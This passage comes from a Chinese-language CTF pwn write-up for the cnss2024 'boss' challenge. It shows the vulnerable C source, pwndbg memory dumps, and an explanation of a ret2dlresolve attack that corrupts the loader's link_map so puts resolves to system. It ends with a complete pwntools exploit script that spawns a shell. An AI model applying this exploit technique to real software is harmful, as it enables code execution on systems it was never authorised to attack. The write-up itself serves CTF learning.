    <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/dev/urandom"</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="n">fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
        <span class="n">_Exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">passwd</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="mh">0x2000</span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span> <span class="p">,</span> <span class="n">MAP_ANONYMOUS</span> <span class="o">|</span> <span class="n">MAP_PRIVATE</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">passwd</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">);</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="n">passwd</span><span class="p">,</span> <span class="s">"deadbeef"</span><span class="p">,</span> <span class="mh">0x8</span><span class="p">);</span>
    <span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
    <span class="k">return</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div> <h5 id="动态调试一下发现多划分了0x2000的长度">   动态调试一下，发现多划分了0x2000的长度。<br/></h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">x</span><span class="o">/</span><span class="mi">10</span><span class="n">gx</span> <span class="mh">0x4040A0</span> 
<span class="mh">0x4040a0</span> <span class="o">&lt;</span><span class="n">passwd</span><span class="o">&gt;:</span>      <span class="mh">0x00007ffff7fb9000</span>      <span class="mh">0x0000000000000000</span>
<span class="mh">0x4040b0</span><span class="o">:</span>       <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span>
<span class="mh">0x4040c0</span><span class="o">:</span>       <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span>
<span class="mh">0x4040d0</span><span class="o">:</span>       <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span>
<span class="mh">0x4040e0</span><span class="o">:</span>       <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span>
<span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">vmmap</span>
<span class="mh">0x7ffff7fb9000</span>     <span class="mh">0x7ffff7fbd000</span> <span class="n">rw</span><span class="o">-</span><span class="n">p</span>     <span class="mi">4000</span>      <span class="mi">0</span> <span class="p">[</span><span class="n">anon_7ffff7fb9</span><span class="p">]</span>
</code></pre></div></div> <h5 id="再查看一下linkmap的地址">   再查看一下linkmap的地址，</h5> <h5 id="再看看mainread_num就是atoll">   再看看<code class="language-plaintext highlighter-rouge">main()</code>，<code class="language-plaintext highlighter-rouge">read_num()</code>就是<code class="language-plaintext highlighter-rouge">atoll()</code>。<br/></h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">offset</span><span class="p">,</span> <span class="n">value</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x10</span><span class="p">];</span>
    <span class="n">init</span><span class="p">();</span>

    <span class="n">myread</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">);</span>
    <span class="k">do</span><span class="p">{</span>
        <span class="n">offset</span> <span class="o">=</span> <span class="n">read_num</span><span class="p">();</span>
        <span class="n">value</span> <span class="o">=</span> <span class="n">read_num</span><span class="p">();</span>
        <span class="o">*</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="o">*</span><span class="p">)</span><span class="n">passwd</span> <span class="o">+</span> <span class="n">offset</span><span class="p">)</span> <span class="o">^=</span> <span class="n">value</span><span class="p">;</span>
    <span class="p">}</span><span class="k">while</span><span class="p">(</span><span class="o">!</span><span class="n">strncmp</span><span class="p">(</span><span class="n">passwd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">));</span>
    
    <span class="n">puts</span><span class="p">(</span><span class="n">passwd</span><span class="p">);</span>
    <span class="n">_Exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div> <h5 id="大致内容比较明确从passwd开始的位置可以8字节一组任意写前提是知道原本那个地址的内容是什么这道题比较难回显所以考虑ret2dlresolve想法是由于puts在最后才会第一次调用也就是那时会调用一次__dl_runtime_resolve来重定位puts另外的由于无法控制压栈的内容所以解释puts时的rel_arg和linkmap不能变所以放弃伪造linkmap由于mmap的空间在ld内存的低位而且偏移不变所以可以尝试修改到ld的内容改变linkmap内的内容实现误导__dl_runtime_resolve">   大致内容比较明确，从passwd开始的位置可以8字节一组任意写，前提是知道原本那个地址的内容是什么。<br/>   这道题比较难回显，所以考虑ret2dlresolve。想法是，由于<code class="language-plaintext highlighter-rouge">puts()</code>在最后才会第一次调用，也就是那时会调用一次<code class="language-plaintext highlighter-rouge">__dl_runtime_resolve</code>来重定位<code class="language-plaintext highlighter-rouge">puts</code>.<br/>   另外的，由于无法控制压栈的内容，所以解释<code class="language-plaintext highlighter-rouge">puts</code>时的<code class="language-plaintext highlighter-rouge">rel_arg</code>和<code class="language-plaintext highlighter-rouge">linkmap</code>不能变，所以放弃伪造<code class="language-plaintext highlighter-rouge">linkmap</code>。<br/>   由于mmap的空间在ld内存的低位，而且偏移不变，所以可以尝试修改到ld的内容，改变linkmap内的内容，实现误导<code class="language-plaintext highlighter-rouge">__dl_runtime_resolve</code>。</h5> <h5 id="首先查看一下linkmap的地址发现都在ld内重点修改的是执行文件的linkmap">   首先查看一下linkmap的地址，发现都在ld内，重点修改的是执行文件的linkmap</h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">linkmap</span>
<span class="n">Node</span>           <span class="n">Objfile</span>                                                            <span class="n">Load</span> <span class="n">Bias</span>      <span class="n">Dynamic</span> <span class="n">Segment</span> 
<span class="mh">0x7ffff7ffe2e0</span> <span class="o">&lt;</span><span class="n">Unknown</span><span class="p">,</span> <span class="n">likely</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">pwn</span><span class="o">/</span><span class="n">worktable</span><span class="o">/</span><span class="n">cnss2024</span><span class="o">/</span><span class="n">boss</span><span class="o">/</span><span class="n">src</span><span class="o">/</span><span class="n">attachment</span><span class="o">&gt;</span> <span class="mh">0x555555554000</span> <span class="mh">0x555555557df8</span>  
<span class="mh">0x7ffff7ffe890</span> <span class="n">linux</span><span class="o">-</span><span class="n">vdso</span><span class="p">.</span><span class="n">so</span><span class="p">.</span><span class="mi">1</span>                                                    <span class="mh">0x7ffff7fc1000</span> <span class="mh">0x7ffff7fc13a0</span>  
<span class="mh">0x7ffff7fbb160</span> <span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">x86_64</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">libc</span><span class="p">.</span><span class="n">so</span><span class="p">.</span><span class="mi">6</span>                                    <span class="mh">0x7ffff7d83000</span> <span class="mh">0x7ffff7f9cbc0</span>  
<span class="mh">0x7ffff7ffdaf0</span> <span class="o">/</span><span class="n">lib64</span><span class="o">/</span><span class="n">ld</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">x86</span><span class="o">-</span><span class="mi">64</span><span class="p">.</span><span class="n">so</span><span class="p">.</span><span class="mi">2</span>                                        <span class="mh">0x7ffff7fc3000</span> <span class="mh">0x7ffff7ffce80</span>  
</code></pre></div></div> <h5 id="思路是重定向时__dl_runtime_resolve会借助dynstr中的字符串在libc的linkmap中查找目标字符串的偏移这个偏移libc基址-被写到gotplt中所以这里实际上有两种方法第一种方法伪造一个dynstr使重定位查找到的不是puts而是system第二种方法修改linkmap中libc的基地址使gotplt中被写入我们指定的函数博主的方法是第一种方法并且使用docker容器作为环境但是这种方法在docker容器中直接运行可以getshelldocker容器把attachment挂到端口上打远程时就不行推测是直接运行的文件的内存布局和挂在端口上的不一样尝试爆破出两者的偏移结果也没用">   思路是，重定向时<code class="language-plaintext highlighter-rouge">__dl_runtime_resolve</code>会借助<code class="language-plaintext highlighter-rouge">.dynstr</code>中的字符串，在libc的linkmap中查找目标字符串的偏移，这个偏移+libc基址 被写到.got.plt中。所以这里实际上有两种方法，第一种方法，伪造一个.dynstr，使重定位查找到的不是<code class="language-plaintext highlighter-rouge">puts</code>，而是<code class="language-plaintext highlighter-rouge">system</code>；第二种方法，修改linkmap中libc的基地址，使.got.plt中被写入我们指定的函数。<br/>   博主的方法是第一种方法，并且使用docker容器作为环境，但是这种方法在docker容器中直接运行可以getshell，docker容器把attachment挂到端口上打远程时就不行，推测是直接运行的文件的内存布局和挂在端口上的不一样，尝试爆破出两者的偏移结果也没用。</h5> <h5 id="exppy仅供参考更具体的思路是将linkmap中的l-infodt_strtab修改最后一位lsb变为l-infodt_debug的地址dt_debug结构体的地址成员指向的是ldso中的一段可读写内存所以在这个位置的0x3eputs字符串在dynstr中的偏移偏移处伪造一个systemx00字样0x3e偏移处正好全是x00方便了工作">   exp.py仅供参考，更具体的思路是将linkmap中的<code class="language-plaintext highlighter-rouge">l-&gt;info[DT_STRTAB]</code>修改最后一位(LSB)，变为<code class="language-plaintext highlighter-rouge">l-&gt;info[DT_DEBUG]</code>的地址，DT_DEBUG结构体的地址成员指向的是ld.so中的一段可读写内存，所以在这个位置的0x3e（puts字符串在.dynstr中的偏移）偏移处伪造一个<code class="language-plaintext highlighter-rouge">system\x00</code>字样，0x3e偏移处正好全是<code class="language-plaintext highlighter-rouge">\x00</code>，方便了工作。</h5> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="n">os</span> <span class="kn">import</span> <span class="n">system</span>
<span class="k">def</span> <span class="nf">debug</span><span class="p">(</span><span class="n">cmd</span><span class="o">=</span><span class="sh">''</span><span class="p">):</span>
    <span class="nf">system</span><span class="p">(</span><span class="sh">"</span><span class="s">gdb --pi={}</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">pid</span><span class="p">))</span>
    <span class="c1">#system("gdb -q -ex 'target remote localhost:8000'")
</span>    <span class="nf">pause</span><span class="p">()</span>
<span class="k">def</span> <span class="nf">key</span><span class="p">(</span><span class="n">sh</span><span class="p">,</span> <span class="n">crypto</span><span class="p">):</span> <span class="c1"># 目标比特串，原本的比特串
</span>    <span class="n">key</span> <span class="o">=</span> <span class="sh">''</span>
    <span class="n">ret</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="n">length</span> <span class="o">=</span> <span class="nf">len</span><span class="p">(</span><span class="n">sh</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="n">length</span><span class="p">):</span>
        <span class="n">temp</span> <span class="o">=</span> <span class="nf">chr</span><span class="p">(</span><span class="n">sh</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">crypto</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
        <span class="n">key</span> <span class="o">+=</span> <span class="n">temp</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="n">length</span><span class="p">):</span>
        <span class="n">ret</span> <span class="o">+=</span> <span class="nf">pow</span><span class="p">(</span><span class="mi">256</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span> <span class="o">*</span> <span class="nf">ord</span><span class="p">(</span><span class="n">key</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
    <span class="k">return</span> <span class="n">ret</span>

<span class="k">def</span> <span class="nf">xorsend</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="n">payload</span><span class="p">):</span>
    <span class="n">io</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">offset</span><span class="p">)</span>
    <span class="nf">sleep</span><span class="p">(</span><span class="mf">0.01</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
    <span class="nf">sleep</span><span class="p">(</span><span class="mf">0.01</span><span class="p">)</span>

<span class="c1"># io = remote("152.136.11.155",10039)
</span><span class="n">io</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">"</span><span class="s">localhost</span><span class="sh">"</span><span class="p">,</span> <span class="mi">8000</span><span class="p">)</span>
<span class="c1"># io = process("./boss/src/attachment")
</span><span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="sh">"</span><span class="s">debug</span><span class="sh">"</span>
<span class="n">io</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">sh</span><span class="se">\x00</span><span class="sh">'</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">16</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="c1"># passwd头部改成'sh\0'，绕过strncmp()
</span><span class="nf">xorsend</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="nf">str</span><span class="p">(</span><span class="nf">key</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">sh</span><span class="se">\x00</span><span class="sh">'</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">dea</span><span class="sh">'</span><span class="p">)))</span>
<span class="c1"># print(io.recvline())
# 修改l-&gt;info[DT_STRTAB]的LSB，指向l-&gt;info[DT_DEBUG]
</span><span class="n">of</span> <span class="o">=</span> <span class="mh">0x1000</span><span class="o">*</span><span class="p">(</span><span class="o">-</span><span class="mi">6</span><span class="p">)</span>
<span class="n">offset1</span> <span class="o">=</span> <span class="p">(</span><span class="mh">0x7ffff7ffe348</span> <span class="o">-</span> <span class="mh">0x7ffff7fb9000</span> <span class="o">+</span> <span class="n">of</span><span class="p">)</span> <span class="o">//</span> <span class="mi">8</span> <span class="c1"># 0x45348 0x4a348
</span><span class="nf">xorsend</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">offset1</span><span class="p">),</span> <span class="nf">str</span><span class="p">(</span><span class="nf">key</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="se">\xb8</span><span class="sh">'</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x78</span><span class="sh">'</span><span class="p">)))</span>
<span class="c1"># 在0x3e处开始伪造system\x00字样
</span><span class="n">offset2</span> <span class="o">=</span> <span class="p">(</span><span class="mh">0x7ffff7ffe118</span> <span class="o">-</span> <span class="mh">0x7ffff7fb9000</span> <span class="o">+</span> <span class="n">of</span><span class="p">)</span> <span class="o">//</span> <span class="mi">8</span> <span class="c1"># 0x45118 0x4a118
</span><span class="nf">xorsend</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">offset2</span> <span class="o">+</span> <span class="mi">7</span><span class="p">),</span> <span class="nf">str</span><span class="p">(</span><span class="nf">key</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x73\x79</span><span class="sh">'</span><span class="p">.</span><span class="nf">rjust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">),</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="o">*</span><span class="mi">8</span><span class="p">)))</span>

<span class="nf">xorsend</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">offset2</span> <span class="o">+</span> <span class="mi">8</span><span class="p">),</span> <span class="nf">str</span><span class="p">(</span><span class="nf">key</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x73\x74\x65\x6d</span><span class="sh">'</span><span class="p">.</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">),</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="o">*</span><span class="mi">8</span><span class="p">)))</span>
<span class="sh">'''</span><span class="s">
0x7f1e1f0f1148: 0x0000000000000000      0x7379000000000000
0x7f1e1f0f1158: 0x000000007374656d      0x0000000000000000
</span><span class="sh">'''</span>
<span class="c1"># 再把开头处改成'/bin/sh\0'，跳出循环
</span><span class="nf">xorsend</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="nf">str</span><span class="p">(</span><span class="nf">key</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">/bin/sh</span><span class="se">\x00</span><span class="sh">'</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">sh</span><span class="se">\x00</span><span class="s">dbeef</span><span class="sh">'</span><span class="p">)))</span>
<span class="n">io</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
</code></pre></div></div> <h5 id="第二种方法是出题人迪普朋克提示的但没有想到怎么实现puts和system在libc中的偏移有16进制下的五位之多由于无法泄露libc基址异或最多修改三位所以不知道具体怎么写">   第二种方法是出题人迪普朋克提示的，但没有想到怎么实现，<code class="language-plaintext highlighter-rouge">puts</code>和<code class="language-plaintext highlighter-rouge">system()</code>在libc中的偏移有16进制下的五位之多，由于无法泄露libc基址，异或最多修改三位，所以不知道具体怎么写。</h5> <h5 id="补几天之后打通了远程发现是nc远程启动的进程和docker容器内本地启动的进程内存布局不一样mmap分配的空间的位置不一样把上面exp的地址改一下就可以">   补：几天之后打通了远程，发现是nc远程启动的进程和docker容器内本地启动的进程内存布局不一样，<code class="language-plaintext highlighter-rouge">mmap()</code>分配的空间的位置不一样，把上面exp的地址改一下就可以。</h5>]]></content><author><name>久菜合子</name></author><category term="CTF"/><category term="pwn"/><summary type="html"><![CDATA[参考资料： 实例文件为boss题的attachment，见github https://zhuanlan.zhihu.com/p/37572651 https://ctf-wiki.org/executable/elf/structure/basic-info/ https://deepunk.icu/dl%E7%9B%B8%E5%85%B3%E6%94%BB%E5%87%BB%E6%B1%87%E6%80%BB/ https://www.soinside.com/question/AENBEApAgMMbfzPviVeoBc]]></summary></entry></feed>